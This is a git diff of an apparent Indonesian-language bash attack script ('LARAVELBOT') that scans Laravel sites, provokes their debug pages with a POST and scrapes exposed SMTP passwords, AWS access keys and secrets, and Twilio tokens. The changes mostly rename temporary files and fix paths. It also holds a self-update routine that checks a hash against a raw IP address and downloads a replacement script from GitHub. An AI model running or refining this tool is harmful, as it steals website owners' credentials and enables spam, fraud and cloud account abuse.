@@ -108,29 +108,29 @@ REGIONPAS3=$(echo "$ambilenv" | grep -Po 'S3_REGION=\K[^ ]+')
         fi
 }
 MethodAws2(){
-env=$(curl -skL --silent --max-time 10 --connect-timeout 10 --request POST "${TARGET}" -o km.htm -A "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0." -H "Upgrade-Insecure-Requests" -d "h4xor=c0up" -o cok/km.htm)
-TH=$(cat cok/km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<pre' | grep "<td \|MAIL_HOST" > cok/k.htm)
-TP=$(cat cok/km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_PORT" > cok/kc.htm)
-TU=$(cat cok/km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_USERNAME" > cok/kd.htm)
-TS=$(cat cok/km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_PASSWORD" > cok/ke.htm)
-FM=$(cat cok/km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_FROM_ADDRESS" > cok/kf.htm)
-KTH=$(cat cok/k.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
-KTP=$(cat cok/kc.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
-KTU=$(cat cok/kd.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
-KTS=$(cat cok/ke.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
-KTF=$(cat cok/kf.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
-SES1=$(cat cok/km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|AWS_ACCESS_KEY_ID\|AWS_KEY\|SES_KEY" > cok/ses1.htm)
-SES2=$(cat cok/km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|AWS_SECRET_ACCESS_KEY\|AWS_SECRET\|SES_SECRET" > cok/ses2.htm)
-SES3=$(cat cok/km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|AWS_SECRET_ACCESS_KEY\|AWS_REGION\|SES_REGION" > cok/ses3.htm)
-TWILIO=$(cat cok/km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|TWILIO_SID" > tw.htm)
-TWILIO1=$(cat cok/km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|TWILIO_TOKEN" > tw1.htm)
-TWILIO2=$(cat cok/km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|TWILIO_FROM" > tw3.htm)
-TW1=$(cat cok/tw.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
-TW2=$(cat cok/tw1.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
-TW3=$(cat cok/tw3.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
-USER1=$(cat ses1.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
-PASS1=$(cat ses2.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
-REG1=$(cat ses3.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+env=$(curl -skL --silent --max-time 10 --connect-timeout 10 --request POST "${TARGET}" -o km.txt -A "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0." -H "Upgrade-Insecure-Requests" -d "h4xor=c0up" -o cok/km.txt)
+TH=$(cat cok/km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<pre' | grep "<td \|MAIL_HOST" > cok/k.txt)
+TP=$(cat cok/km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_PORT" > cok/kc.txt)
+TU=$(cat cok/km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_USERNAME" > cok/kd.txt)
+TS=$(cat cok/km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_PASSWORD" > cok/ke.txt)
+FM=$(cat cok/km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_FROM_ADDRESS" > cok/kf.txt)
+KTH=$(cat cok/k.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+KTP=$(cat cok/kc.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+KTU=$(cat cok/kd.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+KTS=$(cat cok/ke.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+KTF=$(cat cok/kf.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+SES1=$(cat cok/km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|AWS_ACCESS_KEY_ID\|AWS_KEY\|SES_KEY" > cok/ses1.txt)
+SES2=$(cat cok/km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|AWS_SECRET_ACCESS_KEY\|AWS_SECRET\|SES_SECRET" > cok/ses2.txt)
+SES3=$(cat cok/km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|AWS_SECRET_ACCESS_KEY\|AWS_REGION\|SES_REGION" > cok/ses3.txt)
+TWILIO=$(cat cok/km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|TWILIO_SID" > cok/tw.txt)
+TWILIO1=$(cat cok/km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|TWILIO_TOKEN" > cok/tw1.txt)
+TWILIO2=$(cat cok/km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|TWILIO_FROM" > cok/tw3.txt)
+TW1=$(cat cok/tw.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+TW2=$(cat cok/tw1.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+TW3=$(cat cok/tw3.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+USER1=$(cat cok/ses1.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+PASS1=$(cat cok/ses2.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+REG1=$(cat cok/ses3.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
  if [[ -z $KTH || $KTH =~ "null" || $KTH =~ "localhost" || $KTH =~ "mailtrap.io" || $KTH =~ "smtp.mailtrap.io" ]]; then
                 echo "${TARGET}" >> cms/laravel.txt
         else
@@ -174,7 +174,7 @@ CX=`cat $0 | sha256sum`
 CZ=`curl "http://103.146.202.117/cdg.txt" -s | sha256sum`
 	if [[ $CX != $CZ ]]; then
 		echo "Updating script... Please wait."
-		wget -q "https://raw.githubusercontent.com/indo2010re/LARAVELBOT/master/yo.txt";rm scan;mv yo.txt scan;chmod -R 755/cok;chmod -R 755 scan
+		wget -q "https://raw.githubusercontent.com/indo2010re/LARAVELBOT/master/yo.txt";rm scan;mv yo.txt scan;chmod -R 755 /cok;chmod -R 755 scan
 		echo -e "Siap dijalankan $MERAH $B $USER $NOR"
 	else
 		echo "Script sudah terbaru"
